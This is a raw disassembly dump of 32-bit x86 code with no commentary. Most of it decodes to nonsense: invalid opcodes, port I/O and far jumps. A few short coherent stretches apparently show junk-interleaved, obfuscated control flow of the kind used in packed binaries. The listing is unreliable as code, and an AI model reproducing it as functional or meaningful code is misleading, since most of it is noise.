  4020ef:	mov    ecx,es
  4020f1:	fld    DWORD PTR [ebx+ebp*8]
  4020f4:	push   esp
  4020f5:	sub    BYTE PTR [edx],cl
  4020f7:	push   esi
  4020f8:	shl    DWORD PTR [ecx+0x5cbbe25c],0x8d
  4020ff:	daa    
  402100:	mov    esi,0x5210619d
  402105:	(bad)  
  402106:	cmp    al,0x91
  402108:	in     eax,dx
  402109:	out    0x56,al
  40210b:	pusha  
  40210c:	leave  
  40210d:	data16 ds add al,0xcf
  402111:	inc    edx
  402112:	adc    esi,DWORD PTR [eax]
  402114:	adc    al,0x54
  402116:	sub    al,0x8d
  402118:	loop   0x4020a2
  40211a:	xlat   BYTE PTR ds:[ebx]
  40211b:	jge    0x40218f
  40211d:	(bad)  [esi+0x1059f76b]
  402124:	mov    dl,BYTE PTR [ebp-0x716b4665]
  40212a:	cmp    ch,ch
  40212c:	ss pop esp
  40212e:	loop   0x4020b0
  402130:	inc    esi
  402131:	arpl   WORD PTR [edx],ax
  402133:	pop    edi
  402134:	imul   edx,esi,0x40
  402137:	inc    edi
  402138:	popa   
  402139:	jge    0x4021ab
  40213b:	addr16 icebp 
  40213d:	fiadd  WORD PTR [ecx+0x1036b711]
  402143:	sahf   
  402144:	sub    eax,DWORD PTR [edi+0x3f]
  402147:	cmp    ah,BYTE PTR [ebp+0x63]
  40214a:	mov    ds:0x6186e49d,al
  40214f:	repz mov ah,0x5f
  402152:	bound  ecx,QWORD PTR [esi+0x59]
  402155:	rol    BYTE PTR [edi-0x42],1
  402158:	mov    eax,0xe60699bf
  40215d:	xor    DWORD PTR [ebp+0x22d7cd83],ecx
  402163:	lods   eax,DWORD PTR ds:[esi]
  402164:	or     bh,BYTE PTR [ebp-0x4f9ae170]
  40216a:	(bad)  
  40216b:	call   0xff3616a9
  402170:	pop    ebp
  402171:	out    0xd9,al
  402173:	dec    esi
  402174:	and    BYTE PTR [edi],dh
  402176:	dec    ecx
  402177:	sub    BYTE PTR [eax],dh
  402179:	dec    ebp
  40217a:	pop    ds
  40217b:	ss data16 test al,0xf4
  40217f:	inc    edx
  402180:	dec    eax
  402181:	loope  0x4021de
  402183:	mov    edx,DWORD PTR [ecx-0x6ab1b566]
  402189:	inc    esi
  40218a:	(bad)  
  40218b:	push   ebx
  40218c:	xchg   edx,eax
  40218d:	dec    ecx
  40218e:	addr16 or al,0x85
  402191:	enter  0x3dd1,0x33
  402195:	mov    ch,0xe2
  402197:	shr    BYTE PTR [edi-0x14d725f9],cl
  40219d:	mov    ebx,0xd42a779d
  4021a2:	adc    DWORD PTR [eax],ebx
  4021a4:	push   cs
  4021a5:	into   
  4021a6:	dec    edi
  4021a7:	pop    edx
  4021a8:	sub    BYTE PTR [edi-0x6e],0xe
  4021ac:	fs cmp eax,0x75a36108
  4021b2:	test   BYTE PTR [ecx+0xafc2d66],ah
  4021b8:	xor    DWORD PTR [edx],ebx
  4021ba:	xor    eax,0xebd1fdbd
  4021bf:	xchg   DWORD PTR [ebp+0x397f974d],eax
  4021c5:	ror    DWORD PTR [edx+eax*8-0x6a5cbc0f],1
  4021cc:	dec    esi
  4021cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021ce:	mov    eax,0x173eabe
  4021d3:	test   al,0xc7
  4021d5:	ret    
  4021d6:	dec    edx
  4021d7:	repz sub ebp,0xcb9434ed
  4021de:	mov    cl,0x42
  4021e0:	sbb    bh,BYTE PTR [eax+0x64256d02]
  4021e6:	pushf  
  4021e7:	mov    edi,0xb9ad49e3
  4021ec:	jno    0x4021da
  4021ee:	mov    BYTE PTR [edi+0x52],bh
  4021f1:	add    esi,DWORD PTR [eax-0x780c39d9]
  4021f7:	jge    0x4021e8
  4021f9:	es push cs
  4021fb:	sub    BYTE PTR [edi],0x83
  4021fe:	add    al,0x57
  402200:	cmp    ebp,edi
  402202:	inc    ebx
  402203:	mov    dl,0xf7
  402205:	les    ebx,FWORD PTR [esi+0x328e4dfe]
  40220b:	scas   al,BYTE PTR es:[edi]
  40220c:	adc    eax,0x58f07e0e
  402211:	xchg   esp,eax
  402212:	sub    DWORD PTR [esi-0x4264bc01],edx
  402218:	out    dx,al
  402219:	ret    
  40221a:	mov    ebx,0xb782d146
  40221f:	sub    ah,bh
  402221:	clc    
  402222:	int3   
  402223:	pop    eax
  402224:	pop    ebp
  402225:	test   DWORD PTR [ecx],0x73df703c
  40222b:	sub    bh,BYTE PTR [eiz*8-0x79b5891d]
  402232:	push   ss
  402233:	mov    edx,0x35553f44
  402238:	and    edi,DWORD PTR [edi]
  40223a:	mov    ds:0x20dab8fd,al
  40223f:	cmp    edx,DWORD PTR [ebp-0x4d838ced]
  402245:	and    bl,ah
  402247:	loopne 0x4022a8
  402249:	jne    0x4021d6
  40224b:	mov    eax,0x8b3bab83
  402250:	dec    ebp
  402251:	or     al,0x33
  402253:	(bad)  
  402254:	lea    eax,[eax+eax*1+0x32729a]
  40225b:	xor    ecx,esi
  40225d:	sub    ecx,eax
  40225f:	mov    ax,WORD PTR [ebp-0x4]
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi-0x2c120a1f],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x402279
  4022a2:	jp     0x4022b5
  4022a4:	dec    ebx
  4022a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022a6:	sbb    dl,dh
  4022a8:	mov    al,ds:0x7dffdd01
  4022ad:	jmp    0x40227f
  4022af:	pop    edi
  4022b0:	xor    dh,dh
  4022b2:	pushf  
  4022b3:	pop    esi
  4022b4:	mov    WORD PTR [edi+0x28],fs
  4022b7:	in     al,0x6b
  4022b9:	push   es
  4022ba:	out    0x5,eax
  4022bc:	out    0xd2,al
  4022be:	popa   
  4022bf:	arpl   bp,bp
  4022c1:	cmp    ah,bl
  4022c3:	into   
  4022c4:	pop    ds
  4022c5:	lods   al,BYTE PTR ds:[esi]
  4022c6:	rcr    edi,0x3e
  4022c9:	xchg   ebp,eax
  4022ca:	test   eax,0x23987ca1
  4022cf:	mov    WORD PTR [edi],ds
  4022d1:	xchg   ebx,eax
  4022d2:	xchg   ecx,eax
  4022d3:	fcomp  st(3)
  4022d5:	adc    BYTE PTR [esi+eax*2],ah
  4022d8:	ins    DWORD PTR es:[edi],dx
  4022d9:	imul   ecx,DWORD PTR [esi+eax*2-0x3],0x1a
  4022de:	mov    WORD PTR [ebx+0x1920895],fs
  4022e4:	and    DWORD PTR [ebx+0x2d],ebx
  4022e7:	pop    ebp
  4022e8:	jno    0x402363
  4022ea:	popf   
  4022eb:	xchg   esi,eax
  4022ec:	psubw  mm3,QWORD PTR ds:0xd22defb4
  4022f3:	mov    cl,0x5a
  4022f5:	std    
  4022f6:	push   ecx
  4022f7:	inc    ebx
  4022f8:	popa   
  4022f9:	(bad)
  4022fc:	xlat   BYTE PTR ds:[ebx]
  4022fd:	pop    ds
  4022fe:	hlt    
  4022ff:	hlt    
  402300:	push   ebp
  402301:	outs   dx,DWORD PTR ds:[esi]
  402302:	pop    eax
  402303:	loopne 0x4022e4
  402305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402306:	mov    fs,WORD PTR ds:0xfd78f80a
  40230c:	dec    ebx
  40230d:	sbb    al,0x81
  40230f:	rol    DWORD PTR [ecx],0x42
  402312:	lods   al,BYTE PTR ds:[esi]
  402313:	loopne 0x402309
  402315:	popf   
  402316:	mov    al,ds:0xc023a8c7
  40231b:	cmp    ch,bl
  40231d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40231e:	js     0x402303
  402320:	mov    bh,0xa
  402322:	(bad)  
  402323:	push   esp
  402324:	adc    WORD PTR [edx-0x75],si
  402328:	call   0xce32:0x174c43b
  40232f:	out    dx,al
  402330:	pop    ss
  402331:	ins    DWORD PTR es:[edi],dx
  402332:	inc    edi
  402333:	out    0xac,eax
  402335:	cdq    
  402336:	pushf  
  402337:	and    dh,BYTE PTR [esi]
  402339:	add    DWORD PTR [edx],0xffffffec
  40233c:	int    0xb4
  40233e:	ins    DWORD PTR es:[edi],dx
  40233f:	adc    DWORD PTR [ecx+edi*8+0x39f8271e],edi
  402346:	jbe    0x402310
  402348:	out    0xab,al
  40234a:	(bad)  
  40234b:	mov    edx,0xf857d343
  402350:	popa   
  402351:	addr16 dec ebp
  402353:	dec    esp
  402354:	ins    BYTE PTR es:[edi],dx
  402355:	call   0x18ea4375
  40235a:	imul   esp,DWORD PTR ss:[esp+edx*8-0x31a817f4],0x6d7dfbc4
  402366:	cmp    ebx,eax
  402368:	inc    edx
  402369:	loope  0x4023ab
  40236b:	aaa    
  40236c:	jo     0x402338
  40236e:	cmp    eax,0xd224c037
  402373:	mov    WORD PTR [ebp+0x7ab3f152],fs
  402379:	jg     0x4023e8
  40237b:	and    DWORD PTR [edx],ecx
  40237d:	into   
  40237e:	mov    WORD PTR [esi+0x2bc2dec8],es
  402384:	bound  ecx,QWORD PTR [edi+0x63]
  402387:	ss mov bl,0x30
  40238a:	mov    eax,ds:0x7c2c91a
  40238f:	mov    ds:0xa74faa11,al
  402394:	mov    bl,0xd
  402396:	shr    BYTE PTR [ebp+0x6e],1
  402399:	adc    esi,DWORD PTR [ebx]
  40239b:	push   es
  40239c:	sub    esi,DWORD PTR [ecx-0x11]
  40239f:	cmp    al,0x9a
  4023a1:	jl     0x402380
  4023a3:	pop    edx
  4023a4:	jmp    0x13c3:0xb47d9e40
  4023ab:	outs   dx,DWORD PTR ds:[esi]
  4023ac:	shl    BYTE PTR [esi+0x68],0x59
  4023b0:	cmp    BYTE PTR [ecx+0x38],ah
  4023b3:	idiv   BYTE PTR [eax+0x7d]
  4023b6:	mov    ds:0x981f7b6c,eax
  4023bb:	pop    ecx
  4023bc:	hlt    
  4023bd:	push   0xffffff9b
  4023bf:	and    eax,0x63243441
  4023c4:	repnz inc esi
  4023c6:	dec    esp
  4023c7:	cmp    dh,BYTE PTR [eax-0x8]
  4023ca:	test   eax,0x5b3c5d6d
  4023cf:	into   
  4023d0:	jne    0x402414
  4023d2:	adc    eax,0x4225ba1c
  4023d7:	ins    DWORD PTR es:[edi],dx
  4023d8:	push   es
  4023d9:	sar    BYTE PTR [ecx+ebp*2+0x52],cl
  4023dd:	adc    al,BYTE PTR [esi]
  4023df:	cmp    eax,0x1ff81006
  4023e4:	and    ebp,DWORD PTR [eax+esi*4-0x36]
  4023e8:	mov    ds:0x208b0fbb,al
  4023ed:	jle    0x402445
  4023ef:	call   0xd93:0x40e08a49
  4023f6:	and    al,0xf0
  4023f8:	mov    esp,0xd447fb42
  4023fd:	fstp   st(1)
  4023ff:	mov    bh,0xbd
  402401:	out    dx,eax
  402402:	cmp    al,0x16
  402404:	and    al,0xf7
  402406:	rcr    BYTE PTR [eax],cl
  402408:	push   ecx
  402409:	push   ebp
  40240a:	and    ecx,DWORD PTR [edx+0x2a]
  40240d:	rcl    ebx,0x72
  402410:	adc    ebx,0x2db2d7b1
  402416:	bswap  ecx
  402418:	dec    ecx
  402419:	jno    0x4023e3
  40241b:	adc    edx,DWORD PTR [ecx]
  40241d:	xchg   ecx,eax
  40241e:	in     eax,0x51
  402420:	mov    ebp,0x652de929
  402425:	jle    0x402432
  402427:	clc    
  402428:	inc    esi
  402429:	les    esp,FWORD PTR [ebx+edx*1+0x4d]
  40242d:	inc    ebp
  40242e:	sub    ecx,DWORD PTR [eax-0x49]
  402431:	push   ds
  402432:	pop    ebp
  402433:	fwait
  402434:	aaa    
  402435:	in     eax,0xec
  402437:	xchg   edi,eax
  402438:	cmp    DWORD PTR [esi-0x3d],0xffffffb8
  40243c:	fistp  DWORD PTR [eax+0x6]
  40243f:	and    esp,ebx
  402441:	xchg   ebx,eax
  402442:	or     DWORD PTR [ecx+ebp*1],esi
  402445:	sbb    dh,BYTE PTR [ebp+0x6d673831]
  40244b:	jmp    0xf863:0x266d8dbf
  402452:	not    DWORD PTR [edi+0x26]
  402455:	dec    ecx
  402456:	ret    
  402457:	(bad)  
  402458:	pop    esi
  402459:	push   ebx
  40245a:	or     al,BYTE PTR [ecx]
  40245c:	into   
  40245d:	push   cs
  40245e:	ins    DWORD PTR es:[edi],dx
  40245f:	mov    cl,0x5d
  402461:	sub    DWORD PTR [ebp+0xf],ecx
  402464:	and    eax,DWORD PTR [edi-0x11e2a869]
  40246a:	into   
  40246b:	ja     0x4024b8
  40246d:	lods   eax,DWORD PTR ds:[esi]
  40246e:	xchg   edx,eax
  40246f:	aaa    
  402470:	xor    BYTE PTR [ebp+0x24],0x4e
  402474:	mov    ecx,0x7fe1e80e
  402479:	in     eax,0xcf
  40247b:	and    BYTE PTR [eax],ch
  40247d:	push   eax
  40247e:	int3   
  40247f:	aaa    
  402480:	test   BYTE PTR ds:0x2c1d8a29,0x56
  402487:	push   ss
  402488:	sbb    dl,bh
  40248a:	fadd   QWORD PTR [ebp-0x7c]
  40248d:	ja     0x402434
  40248f:	aad    0x76
  402491:	mul    DWORD PTR [ebx+0x5d]
  402494:	adc    eax,0xc6f7a6ac
  402499:	cli    
  40249a:	es mov dh,0x76
  40249d:	mov    bl,ch
  40249f:	lods   al,BYTE PTR ds:[esi]
  4024a0:	push   0x55117351
  4024a5:	in     eax,dx
  4024a6:	inc    ebp
  4024a7:	or     edi,DWORD PTR [edx-0x4b]
  4024aa:	and    ah,BYTE PTR [ecx+edx*2]
  4024ad:	out    0xd4,eax
  4024af:	in     eax,0x35
  4024b1:	fisubr DWORD PTR es:[ebx]
  4024b4:	push   edi
  4024b5:	sbb    eax,0x5bf7ab7d
  4024ba:	ja     0x4024c7
  4024bc:	mov    edi,DWORD PTR [ecx]
  4024be:	mov    eax,ds:0x2bbcbd65
  4024c3:	(bad)  
  4024c4:	imul   ebx,DWORD PTR [eax-0x2dd194fb],0xa35f47c0
  4024ce:	xchg   ebp,eax
  4024cf:	jno    0x402542
  4024d1:	jle    0x40251b
  4024d3:	arpl   WORD PTR [edx+ecx*1+0xea9cbc2],dx
  4024da:	jg     0x402513
  4024dc:	repz and eax,0xb0af62ca
  4024e2:	and    DWORD PTR [eax+0x2f],esp
  4024e5:	jns    0x40246c
  4024e7:	test   eax,0xbe08f2bc
  4024ec:	ret    
  4024ed:	pop    edi
  4024ee:	les    edx,FWORD PTR [esi]
  4024f0:	(bad)  
  4024f1:	fisub  DWORD PTR [ebx]
  4024f3:	jle    0x40247b
  4024f5:	xchg   esi,eax
  4024f6:	mov    esi,0x69a0f572
  4024fb:	add    DWORD PTR [ebp-0x79f394f2],edi
  402501:	in     eax,dx
  402502:	jno    0x40249d
  402504:	mov    ch,0xf6
  402506:	fsubr  st(4),st
  402508:	xchg   ecx,eax
  402509:	icebp  
  40250a:	jecxz  0x4024c0
  40250c:	test   BYTE PTR [edx+0x36dd6015],bh
  402512:	ret    0xa8ed
  402515:	dec    esp
  402516:	ins    BYTE PTR es:[edi],dx
  402517:	out    0x3b,al
  402519:	mov    esp,0xa8dba3e5
  40251e:	jge    0x4024f1
  402520:	sbb    dh,BYTE PTR [ebx]
  402522:	loope  0x4024b5
  402524:	shr    DWORD PTR [edi+ecx*8-0x5b6ef097],1
  40252b:	and    eax,0x9bac84ae
  402530:	cmp    al,0x8b
  402532:	jecxz  0x4024f6
  402534:	pop    ss
  402535:	pop    eax
  402536:	push   ds
  402537:	add    al,0x3e
  402539:	pop    ebp
  40253a:	or     DWORD PTR [esi+0x68863cab],esp
  402540:	push   eax
  402541:	sbb    DWORD PTR [edi+0x5b],ecx
  402544:	rcl    esi,0xef
  402547:	and    al,BYTE PTR [ebp-0x3881b4a5]
  40254d:	das    
  40254e:	dec    ebp
  40254f:	pushf  
  402550:	mov    cl,BYTE PTR [esi-0x161e447e]
  402556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402557:	add    ebx,DWORD PTR [ecx-0x10d5ce3]
  40255d:	pop    es
  40255e:	lds    edi,FWORD PTR [ecx+0x60]
  402561:	push   ebp
  402562:	xor    eax,0xb289df59
  402567:	mov    ds:0x1d743699,al
  40256c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40256d:	call   FWORD PTR [ebx-0x22]
  402570:	repz or BYTE PTR [esi-0x17],ah
  402574:	fs sahf 
  402576:	mov    ds:0x7ad4c400,eax
  40257b:	sub    cl,BYTE PTR [ebx]
  40257d:	retfw  0x4a1f
  402581:	or     eax,esp
  402583:	mov    ecx,0x9ff8fa37
  402588:	ins    BYTE PTR es:[edi],dx
  402589:	inc    edi
  40258a:	xor    eax,esi
  40258c:	lea    eax,[eax+ecx*1+0x32729a]
  402593:	mov    WORD PTR [ebp-0x4],ax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	jecxz  0x40257d
  4025af:	jecxz  0x40259e
  4025b1:	jmp    0x7c7e:0x677c7c0f
  4025b8:	jl     0x4025c2
  4025ba:	jle    0x402626
  4025bc:	js     0x402637
  4025be:	cwde   
  4025bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025c0:	jle    0x4025e7
  4025c2:	sets   BYTE PTR [edi]
  4025c5:	dec    ebp
  4025c6:	inc    DWORD PTR [esi-0x3c5c3a04]
  4025cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025cd:	pop    edx
  4025ce:	or     BYTE PTR [edx+ebx*1-0x1da96a3f],0x63
  4025d6:	rcl    DWORD PTR [edx],0x37
  4025d9:	xor    BYTE PTR [edx-0x22a1e6ed],cl
  4025df:	jp     0x402595
  4025e1:	(bad)  [ebx-0x30]
  4025e4:	repz push es
  4025e6:	add    bh,dh
  4025e8:	mov    eax,ds:0xd6109350
  4025ed:	jo     0x40257a
  4025ef:	test   eax,0x99a2f19d
  4025f4:	add    eax,0xf792475c
  4025f9:	xchg   esi,eax
  4025fa:	ror    DWORD PTR [eax-0x5977b756],1
  402600:	leave  
  402601:	leave  
  402602:	add    bl,BYTE PTR [edi+0x453c07f3]
  402608:	test   eax,0x64d89438
  40260d:	or     edx,ebp
  40260f:	rcr    DWORD PTR [esi],0x75
  402612:	push   eax
  402613:	jg     0x40265c
  402615:	rcr    BYTE PTR [esi+ecx*1],cl
  402618:	(bad)  
  402619:	int    0xef
  40261b:	sub    ah,al
  40261d:	push   esi
  40261e:	mov    ds:0xfaf6c284,al
  402623:	ret    0x5bf7
  402626:	jns    0x402699
  402628:	(bad)
  40262c:	int    0xa
  40262e:	push   ebx
  40262f:	jmp    0x8f0b:0x80c0f7ed
  402636:	sahf   
  402637:	test   al,0x19
  402639:	add    al,0xe2
  40263b:	test   DWORD PTR [ebp-0x48cd5204],ebp
  402641:	pusha  
  402642:	pop    ebx
  402643:	scas   al,BYTE PTR es:[edi]
  402644:	dec    edx
  402645:	dec    edi
  402646:	xchg   edi,eax
  402647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402648:	in     al,0x8a
  40264a:	mov    ebp,0x4f45319b
  40264f:	mov    dl,0x53
  402651:	mov    BYTE PTR [edx],ah
  402653:	int    0xd
  402655:	fsubr  QWORD PTR [edx+0x214dc86b]
  40265b:	xor    DWORD PTR [edx-0x58],edx
  40265e:	or     eax,0xdfe70925
  402663:	data16 std 
  402665:	pop    ebp
  402666:	fist   DWORD PTR [ebx]
  402668:	sbb    eax,0xffadb4f6
  40266d:	adc    ah,BYTE PTR [ebx]
  40266f:	adc    BYTE PTR [ecx],cl
  402671:	jo     0x40265f
  402673:	cwde   
  402674:	hlt    
  402675:	xor    DWORD PTR [ebx-0x68],esp
  402678:	aas    
  402679:	sbb    cl,bh
  40267b:	stos   BYTE PTR es:[edi],al
  40267c:	pop    ds
  40267d:	mov    esi,DWORD PTR [edi-0x54]
  402680:	cmp    esp,ebx
  402682:	jns    0x402654
  402684:	test   BYTE PTR [ebx+eiz*8-0x60],bh
  402688:	stos   DWORD PTR es:[edi],eax
  402689:	adc    bl,BYTE PTR [edx+0x25]
  40268c:	fst    st(4)
  40268e:	sbb    bl,BYTE PTR [esi-0x797dc611]
  402694:	mov    dl,0x11
  402696:	outs   dx,BYTE PTR ds:[esi]
  402697:	lahf   
  402698:	fidiv  WORD PTR [edi]
  40269a:	and    BYTE PTR [edi+ecx*8],ah
  40269d:	outs   dx,BYTE PTR ds:[esi]
  40269e:	test   al,0x38
  4026a0:	imul   ebx,ebx,0x45c70630
  4026a6:	xchg   DWORD PTR [edi+0x73],edi
  4026a9:	retf   0x1b49
  4026ac:	inc    eax
  4026ad:	sbb    esi,DWORD PTR ds:0x333e9aea
  4026b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026b4:	push   eax
  4026b5:	xlat   BYTE PTR ds:[ebx]
  4026b6:	(bad)  
  4026b7:	mov    ds:0xaf793139,eax
  4026bc:	mov    ecx,0x31f00d44
  4026c1:	test   DWORD PTR [edx+0x3242661],eax
  4026c7:	pop    esp
  4026c8:	sbb    eax,0xb5eee9ed
  4026cd:	icebp  
  4026ce:	adc    al,0xbe
  4026d0:	push   eax
  4026d1:	outs   dx,DWORD PTR ds:[esi]
  4026d2:	adc    BYTE PTR [eax+0x3742920],dh
  4026d8:	sub    al,0x8b
  4026da:	mov    bl,0xf
  4026dc:	imul   esp,DWORD PTR [esi+0x5f262021],0x26268dcf
  4026e6:	xchg   ebx,eax
  4026e7:	out    0x3b,al
  4026e9:	sub    DWORD PTR [eax-0x906bf08],edx
  4026ef:	out    0x29,eax
  4026f1:	and    DWORD PTR [eax+0x37],edx
  4026f4:	rol    DWORD PTR [edx-0x60],1
  4026f7:	mov    dh,0x17
  4026f9:	inc    esp
  4026fa:	xor    eax,0x8311b2d2
  4026ff:	lock mov BYTE PTR [eax*4+0x674b08bf],dl
  402707:	cmp    BYTE PTR [ebx+edi*1-0xf],bl
  40270b:	mov    ds:0x296b9129,eax
  402710:	mov    dh,0x16
  402712:	dec    ecx
  402713:	mov    esi,0x194c8f1d
  402718:	gs jg  0x402717
  40271b:	out    0xb0,al
  40271d:	in     al,0x42
  40271f:	jg     0x40273b
  402721:	into   
  402722:	add    BYTE PTR [ecx+0x7b1a0cc0],0xee
  402729:	inc    ecx
  40272a:	pop    esi
  40272b:	xor    eax,0x979dfc71
  402730:	shr    bl,0x60
  402733:	shr    eax,cl
  402735:	and    al,0x85
  402737:	cld    
  402738:	fsubr  st(0),st
  40273a:	dec    ecx
  40273b:	stc    
  40273c:	jo     0x402771
  40273e:	in     al,0xb5
  402740:	or     BYTE PTR [ebp-0x28],dl
  402743:	inc    esp
  402744:	mul    ah
  402746:	mov    ecx,DWORD PTR [edi-0x58220f82]
  40274c:	outs   dx,DWORD PTR ds:[esi]
  40274d:	xchg   esi,eax
  40274e:	xlat   BYTE PTR ds:[ebx]
  40274f:	cli    
  402750:	out    0x9b,eax
  402752:	xchg   ebx,eax
  402753:	or     eax,0x2174306c
  402758:	addr16 fsubr DWORD PTR [bx]
  40275c:	sub    al,0xf9
  40275e:	stos   DWORD PTR es:[edi],eax
  40275f:	leave  
  402760:	sbb    esi,DWORD PTR [ebp+0x4359f7dd]
  402766:	dec    edi
  402767:	inc    ebx
  402768:	outs   dx,BYTE PTR ds:[esi]
  402769:	stos   BYTE PTR es:[edi],al
  40276a:	push   esi
  40276b:	fwait
  40276c:	std    
  40276d:	(bad)  
  40276e:	outs   dx,BYTE PTR ds:[esi]
  40276f:	jmp    0xf95f40dc
  402774:	dec    eax
  402775:	in     eax,0x88
  402777:	push   edi
  402778:	sub    BYTE PTR [eax],bh
  40277a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40277b:	jb     0x40279f
  40277d:	sbb    DWORD PTR [esi+0x3beb196f],esp
  402783:	out    0x1a,al
  402785:	jp     0x40270c
  402787:	pop    ss
  402788:	mov    BYTE PTR [eax+0x65],dl
  40278b:	fstp   QWORD PTR [edi+0x73]
  40278e:	xchg   ebx,eax
  40278f:	pop    edx
  402790:	dec    esp
  402791:	ret    0x87a7
  402794:	xchg   esp,eax
  402795:	(bad)  
  402796:	shr    BYTE PTR [ecx],1
  402798:	pusha  
  402799:	adc    DWORD PTR [edi+0x79],ecx
  40279c:	loop   0x4027ea
  40279e:	cdq    
  40279f:	mov    edi,0x2648a854
  4027a4:	mov    ebx,0x6c218bfd
  4027a9:	push   ecx
  4027aa:	in     eax,dx
  4027ab:	add    bh,BYTE PTR [ecx-0x47]
  4027ae:	test   al,0xf3
  4027b0:	lods   al,BYTE PTR ds:[esi]
  4027b1:	repz jne 0x4027ea
  4027b4:	cmp    eax,0x4e98a82a
  4027b9:	adc    al,ah
  4027bb:	mov    ebx,0x3d604dc4
  4027c0:	(bad)  
  4027c2:	fld    TBYTE PTR [edi+0x65]
  4027c5:	loopne 0x402824
  4027c7:	jnp    0x402751
  4027c9:	mov    edx,0xf44c61a2
  4027ce:	mov    ebp,0xb255c411
  4027d3:	ins    DWORD PTR es:[edi],dx
  4027d4:	or     BYTE PTR [ebp-0x86b219f],ah
  4027da:	jb     0x4027a5
  4027dc:	outs   dx,DWORD PTR ds:[esi]
  4027dd:	ins    DWORD PTR es:[edi],dx
  4027de:	add    BYTE PTR [esi-0x6b],dl
  4027e1:	aam    0x4e
  4027e3:	xchg   ebp,eax
  4027e4:	xchg   ecx,eax
  4027e5:	je     0x4027f2
  4027e7:	cmp    eax,DWORD PTR [ecx]
  4027e9:	mov    ch,0xa9
  4027eb:	mov    dl,0x96
  4027ed:	cmp    edi,DWORD PTR [ecx-0x3f]
  4027f0:	inc    ebx
  4027f1:	int3   
  4027f2:	dec    ebp
  4027f3:	dec    ebx
  4027f4:	cmp    bh,BYTE PTR [edi+0x7ae3d81c]
  4027fa:	jne    0x40280c
  4027fc:	pop    eax
  4027fd:	out    0x3,al
  4027ff:	xchg   ebx,eax
  402800:	rcl    esp,cl
  402802:	out    dx,al
  402803:	ins    DWORD PTR es:[edi],dx
  402804:	sbb    DWORD PTR [ebx+0x562c8245],edi
  40280a:	jge    0x402841
  40280c:	fdiv   st(2),st
  40280e:	xchg   edx,eax
  40280f:	loope  0x4027a5
  402811:	aaa    
  402812:	imul   edi,DWORD PTR [ebx-0x17],0x41
  402816:	mov    ebp,0xec1f8a1
  40281b:	rcl    DWORD PTR [esi+0x115ddb4c],cl
  402821:	call   0xdcef4049
  402826:	and    eax,0xbe4a517a
  40282b:	adc    eax,0xbed781ff
  402830:	jl     0x4027cf
  402832:	loop   0x4027e3
  402834:	out    dx,al
  402835:	xlat   BYTE PTR ds:[ebx]
  402836:	xchg   esp,eax
  402837:	not    BYTE PTR [eax+0x23]
  40283a:	cmp    BYTE PTR [ebp+0x6a4259d3],bl
  402840:	in     eax,0x59
  402842:	mov    ebp,0x1cd3c5f7
  402847:	cmc    
  402848:	repz int3 
  40284a:	ret    
  40284b:	mov    edx,0xf319c58
  402850:	push   ss
  402851:	adc    cl,BYTE PTR [ebx]
  402853:	pop    es
  402854:	or     al,0x57
  402856:	(bad)  
  402857:	jge    0x4027fc
  402859:	mov    eax,ds:0x2c5563b3
  40285e:	jp     0x40288b
  402860:	xor    al,BYTE PTR [edx+0x5a]
  402863:	ss aad 0x12
  402866:	mov    BYTE PTR [edi],dl
  402868:	int    0x52
  40286a:	(bad)  
  40286b:	cld    
  40286c:	mov    ds:0xfe3e96a,eax
  402871:	mov    ecx,0xe7cbe37a
  402876:	bound  esi,QWORD PTR [ecx+0x5f6dbd65]
  40287c:	lea    eax,[edi-0x73]
  40287f:	dec    edx
  402880:	add    eax,0x7ccfcb9a
  402885:	aam    0xc7
  402887:	xor    cl,BYTE PTR ds:[edi]
  40288a:	push   ss
  40288b:	int    0xc8
  40288d:	jge    0x4028eb
  40288f:	mov    dl,0xa8
  402891:	cli    
  402892:	push   ds
  402893:	imul   ecx,DWORD PTR [esi-0xb38e84c],0xc201a14c
  40289d:	mov    ebp,0x89451e50
  4028a2:	je     0x4028b6
  4028a8:	mov    eax,DWORD PTR [ebp-0x8]
  4028ab:	mov    DWORD PTR [eax],0x60341e8d
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	add    DWORD PTR [ebp+0x8ddc3cd],esp
  4028e7:	jl     0x402965
  4028e9:	addr16 jle 0x402968
